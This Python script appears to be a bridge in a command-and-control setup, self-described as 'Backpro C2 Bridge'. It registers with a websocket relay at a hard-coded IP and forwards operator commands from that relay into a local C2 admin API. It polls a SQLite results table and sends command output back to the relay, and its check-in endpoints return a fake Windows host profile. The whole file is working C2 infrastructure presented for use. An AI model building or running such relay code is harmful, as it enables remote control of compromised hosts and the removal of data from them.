from SlotSDK import SlotSDK
import requests
import sqlite3
import threading
import time
import socket
import platform
import os
from flask import Flask, request, jsonify

RELAY_URL = "ws://192.168.230.133:8081/ws"
SLOT_ID = "backpro-c2-agent"
BACKPRO_URL = "http://127.0.0.1:5000"
HTTP_PORT = 5001
AGENT_ID_FILE = "agent_id.txt"

app = Flask(__name__)

class BridgeState:
    sdk = None

GLOBAL_AGENT_ID = None
command_mapping = {}

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] [Bridge] {msg}")

@app.route('/', methods=['GET', 'POST'])
@app.route('/checkin', methods=['GET', 'POST'])
@app.route('/register', methods=['GET', 'POST'])
@app.route('/agent', methods=['GET', 'POST'])
def agent_checkin():
    return jsonify({
        "status": "ok",
        "agent_id": 1,
        "slot_id": SLOT_ID,
        "version": "1.0.0",
        "hostname": "DESKTOP-G75BTQ",
        "os": "windows",
        "arch": "AMD64"
    }), 200

@app.route('/command', methods=['POST'])
def receive_command():
    data = request.get_json() or {}
    command = data.get('command', '')
    arguments = data.get('arguments', '')
    if command:
        forward_to_backpro(command, arguments, agent_id=1)
        log(f"Command received from TelePAT: {command} {arguments}")
        return jsonify({"status": "accepted"}), 200
    return jsonify({"status": "error", "message": "no command"}), 400

def forward_to_backpro(command, arguments="", agent_id=1):
    try:
        payload = {
            "command_text": command,
            "arguments": arguments or "",
            "agent_id": agent_id
        }
        r = requests.post(
            f"{BACKPRO_URL}/api/admin/commands",
            json=payload,
            timeout=10
        )
        if r.status_code in (200, 201):
            log(f"Command forwarded successfully to Backpro: '{command}' (agent_id={agent_id})")
            log(f"Backpro response: {r.text}")
        else:
            log(f"Forward failed: HTTP {r.status_code} - {r.text}")
    except Exception as e:
        log(f"Error forwarding to Backpro: {e}")

def send_results_to_telepat():
    try:
        conn = sqlite3.connect("db.sqlite")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT r.id, r.result_data, r.command_id, c.command_text
            FROM Results r
            JOIN Commands c ON r.command_id = c.id
            WHERE r.id > (SELECT COALESCE(MAX(result_id), 0) FROM sent_results)
        """)
        rows = cursor.fetchall()
        conn.close()

        for result_id, result_data, backpro_cmd_id, command_text in rows:
            if BridgeState.sdk and BridgeState.sdk.connected and BridgeState.sdk.registered:
                telepat_cmd_id = command_mapping.get(backpro_cmd_id, "unknown")

                result_payload = {
                    "stdout": result_data.strip(),
                    "stderr": "",
                    "exit_code": 0,
                    "duration": 0,
                    "finished": True,
                    "command_id": telepat_cmd_id
                }

                BridgeState.sdk.send_result(telepat_cmd_id, result_payload)
                log(f"Result sent to TelePAT for TelePAT ID: {telepat_cmd_id} (command: {command_text[:50]})")

                conn = sqlite3.connect("db.sqlite")
                conn.execute("INSERT OR IGNORE INTO sent_results (result_id) VALUES (?)", (result_id,))
                conn.commit()
                conn.close()
    except Exception as e:
        log(f"Error sending results: {e}")

def background_loop():
    while True:
        send_results_to_telepat()
        time.sleep(8)

def command_polling_loop():
    global GLOBAL_AGENT_ID
    while True:
        if BridgeState.sdk.registered and BridgeState.sdk.connected and GLOBAL_AGENT_ID:
            cmd = BridgeState.sdk.request_commands(
                agent_id=GLOBAL_AGENT_ID,
                count=1,
                timeout=10
            )
            if cmd:
                telepat_cmd_id = cmd.get("command_id")
                command_text = cmd.get("input_data", {}).get("command", "").strip()
                arguments = cmd.get("input_data", {}).get("arguments", "")

                if not command_text:
                    log("Warning: Received empty command — skipping")
                    continue

                log(f"New command received from TelePAT! ID: {telepat_cmd_id}")
                log(f"Command: {command_text} {arguments}")

                try:
                    payload = {
                        "command_text": command_text,
                        "arguments": arguments,
                        "agent_id": 1
                    }
                    r = requests.post(f"{BACKPRO_URL}/api/admin/commands", json=payload, timeout=20)
                    if r.status_code in (200, 201):
                        backpro_resp = r.json()
                        backpro_cmd_id = backpro_resp.get("id") or backpro_resp.get("command_id")
                        if backpro_cmd_id:
                            command_mapping[backpro_cmd_id] = telepat_cmd_id
                            log(f"Mapped TelePAT ID {telepat_cmd_id} → Backpro ID {backpro_cmd_id}")
                        log(f"Command successfully forwarded: '{command_text}'")
                    else:
                        log(f"Forward failed: {r.status_code} {r.text}")
                except Exception as e:
                    log(f"Error forwarding command: {e}")

        time.sleep(5)

if __name__ == "__main__":
    log("Starting TelePAT → Backpro Bridge")

    conn = sqlite3.connect("db.sqlite")
    conn.execute("CREATE TABLE IF NOT EXISTS sent_results (result_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=HTTP_PORT, use_reloader=False), daemon=True).start()
    log(f"HTTP server started on port {HTTP_PORT}")

    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, "r") as f:
            try:
                GLOBAL_AGENT_ID = int(f.read().strip())
                log(f"Loaded saved agent_id: {GLOBAL_AGENT_ID}")
            except:
                GLOBAL_AGENT_ID = None

    BridgeState.sdk = SlotSDK(RELAY_URL, SLOT_ID, lambda msg: None, heartbeat_interval=60)
    threading.Thread(target=BridgeState.sdk.run, daemon=True).start()

    while not (BridgeState.sdk.registered and BridgeState.sdk.connected):
        time.sleep(1)
    log("Slot registered and connected")

    if not GLOBAL_AGENT_ID:
        log("Registering new agent")
        result = BridgeState.sdk.send_agent_registration(
            description="Backpro C2 Bridge",
            hostname=socket.gethostname(),
            os_name=platform.system().lower(),
            arch=platform.machine(),
            version="1.0.0",
            timeout=60
        )
        if isinstance(result, int):
            GLOBAL_AGENT_ID = result
            with open(AGENT_ID_FILE, "w") as f:
                f.write(str(GLOBAL_AGENT_ID))
            log(f"New agent registered: {GLOBAL_AGENT_ID}")
        else:
            log("Agent registration failed")
    else:
        log(f"Using existing agent_id: {GLOBAL_AGENT_ID}")

    threading.Thread(target=command_polling_loop, daemon=True).start()
    log("Command polling started")

    threading.Thread(target=background_loop, daemon=True).start()

    log("Bridge fully active")
    while True:
        time.sleep(60)